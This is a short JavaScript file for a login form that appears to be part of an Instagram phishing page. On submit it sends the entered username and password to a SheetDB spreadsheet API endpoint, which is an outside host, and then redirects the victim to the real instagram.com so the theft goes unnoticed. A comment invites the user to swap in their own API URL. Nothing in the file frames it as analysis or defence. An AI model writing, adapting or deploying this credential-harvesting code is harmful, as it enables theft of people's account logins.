// Replace with your actual SheetDB API URL
const SHEETDB_API_URL = "https://sheetdb.io/api/v1/q60i29hdh05sw";

const loginForm = document.getElementById("loginForm");
const loginBtn = document.getElementById("loginBtn");

loginForm.addEventListener("submit", async (e) => {
  e.preventDefault();

  const username = document.getElementById("username").value.trim();
  const password = document.getElementById("password").value;

  if (!username || !password) return;

  loginBtn.disabled = true;
  loginBtn.textContent = "Logging in...";

  try {
    const response = await fetch(SHEETDB_API_URL, {
      method: "POST",
      headers: {
        "Accept": "application/json",
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        data: [
          {
            username: username,
            password: password
          }
        ]
      })
    });

    const result = await response.json();

    if (response.ok) {
      loginForm.reset();
      window.location.href = "https://www.instagram.com/";
    } else {
      console.error("SheetDB Error:", result);
    }
  } catch (error) {
    console.error("Network Error:", error);
  } finally {
    loginBtn.disabled = false;
    loginBtn.textContent = "Log in";
  }
});